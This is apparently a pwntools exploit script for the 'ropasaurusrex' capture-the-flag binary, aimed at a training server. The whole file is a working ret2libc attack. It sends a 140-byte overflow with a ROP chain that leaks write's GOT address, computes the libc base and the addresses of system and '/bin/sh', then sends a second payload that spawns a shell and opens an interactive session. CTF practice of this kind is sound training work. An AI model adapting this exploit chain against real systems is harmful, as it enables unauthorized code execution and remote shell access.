from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']
# ssh = ssh("acidburn", "192.168.56.103")
# r = ssh.process("./ropasaurusrex", env={'LD_PRELOAD': './libc-2.27.so'})
# gdb.attach(r, """
# 	b *0x0804841c
# 	c
# 	""")

r = remote("training.jinblack.it", 2014)
input("wait")


# AAAA
# write 
# gadget 
# arg 1 
# arg 2
# Arg 3
#  <- SP

write = 0x0804830c
arg1 = 1
arg2 = 0x08049614
arg3 = 4

pop3 = 0x080484b6

payload = p32(write) + p32(pop3) + p32(arg1) + p32(arg2) + p32(arg3) + p32(0x80483f4)

r.send(b"A"*140 + payload)

write_got = u32(r.recv(4))
libc_base = write_got - 0xe6d80
system = libc_base + 0x3d200
binsh = libc_base + 0x17e0cf
print("[!] write_got: 0x%08x" % write_got)
print("[!] libc_base: 0x%08x" % libc_base)
print("[!] system: 0x%08x" % system)
print("[!] binsh: 0x%08x" % binsh)

time.sleep(0.1)

payload2 = p32(system) + b"BBBB" + p32(binsh)


r.send(b"A"*140 + payload2)

r.interactive()

